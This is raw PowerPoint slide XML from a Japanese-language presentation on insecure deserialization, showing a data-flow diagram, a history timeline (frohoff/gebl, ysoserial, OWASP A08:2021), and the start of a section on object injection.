          <a:xfrm>
            <a:off x="5397500" y="1606550"/>
            <a:ext cx="1397000" cy="635000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5180330" y="2305050"/>
            <a:ext cx="1831340" cy="612080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1540"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="14171A"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>バイト列</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1540"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6A7179"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Cookie / Session / API / ファイル</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Image 5" descr="connector">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6985000" y="2210991"/>
            <a:ext cx="457200" cy="76200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="12" name="Image 6" descr="rect">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId7"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7632700" y="1802110"/>
            <a:ext cx="1270000" cy="635000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7787055" y="2500610"/>
            <a:ext cx="961192" cy="220960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1540"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E08A3C"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>deserialize()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="14" name="Image 7" descr="connector">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId8"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="9093200" y="2210991"/>
            <a:ext cx="457200" cy="76200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="15" name="Image 8" descr="rect">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId9"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="9867900" y="1704280"/>
            <a:ext cx="1016000" cy="635000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9971484" y="2402780"/>
            <a:ext cx="808732" cy="416520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1540"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>再構築された</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1540"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>オブジェクト</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2963763" y="3250505"/>
            <a:ext cx="6264374" cy="473670"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 15417"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFF4E8"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E08A3C"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="18" name="Image 9" descr="Warning">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId10"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3170138" y="3392091"/>
            <a:ext cx="190500" cy="190500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3462238" y="3380680"/>
            <a:ext cx="576272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4B15"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>攻撃面：バイト列は保存・伝送の間、攻撃者が「改ざん」または「自作」できる地点になり得る</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4171A"/>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63550"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="3450"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>歴史と位置づけ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="815975" y="1533525"/>
            <a:ext cx="2501900" cy="1318220"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7467"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1D2126"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="2B3036"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1022350" y="1739900"/>
            <a:ext cx="2151825"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E08A3C"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>2011〜</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1022350" y="2016720"/>
            <a:ext cx="2151825" cy="234950"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C2C9"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>攻撃ベクターとして認識され始める</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3502025" y="1533525"/>
            <a:ext cx="2501900" cy="1318220"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7467"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1D2126"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="2B3036"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3708400" y="1739900"/>
            <a:ext cx="2151825"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E08A3C"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>2015</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3708400" y="2016720"/>
            <a:ext cx="2151825" cy="444500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C2C9"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>@frohoff / @gebl の講演：Javaデシリアライゼーションの詳細解説</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6188075" y="1533525"/>
            <a:ext cx="2501900" cy="1318220"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7467"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1D2126"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="2B3036"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6394450" y="1739900"/>
            <a:ext cx="2151825"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E08A3C"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>2016</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6394450" y="2016720"/>
            <a:ext cx="2151825" cy="654050"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C2C9"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>"Java Deserialization Apocalypse"／ysoserial公開で爆発的に普及</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8874125" y="1533525"/>
            <a:ext cx="2501900" cy="1318220"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7467"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1D2126"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="2B3036"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9080500" y="1739900"/>
            <a:ext cx="2151825"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3E6FBD"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>現在</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9080500" y="2016720"/>
            <a:ext cx="2151825" cy="444500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C2C9"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>OWASP Top 10 A08:2021 に分類、毎年多数のCVE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="3134320"/>
            <a:ext cx="10566400" cy="603250"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="10566400" h="603250">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="10490200" y="0"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="76200" stAng="16200000" swAng="5400000"/>
                <a:lnTo>
                  <a:pt x="10566400" y="527050"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="76200" stAng="0" swAng="5400000"/>
                <a:lnTo>
                  <a:pt x="0" y="603250"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="1D2126"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="3134320"/>
            <a:ext cx="10566400" cy="603250"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="10566400" h="603250">
                <a:moveTo>
                  <a:pt x="25400" y="603250"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="603250"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25400" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25400" y="603250"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="3E6FBD"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="17" name="Image 0" descr="Warning">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="3334345"/>
            <a:ext cx="203200" cy="203200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1397000" y="3312120"/>
            <a:ext cx="9132927" cy="27305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ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>OWASP A08:2021 — Software and Data Integrity Failures（ソフトウェアとデータの完全性の不具合）の一分類</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="6238280"/>
            <a:ext cx="164603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580"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>01 / 基礎とデータフロー</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6F2"/>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A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>2つの攻撃手法</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="815975" y="1562695"/>
            <a:ext cx="5175250" cy="3783409"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2937"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E0D9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1098550" y="1845270"/>
            <a:ext cx="4748403" cy="220960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1540"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3E6FBD"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>OBJECT INJECTION</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1098550" y="2167830"/>
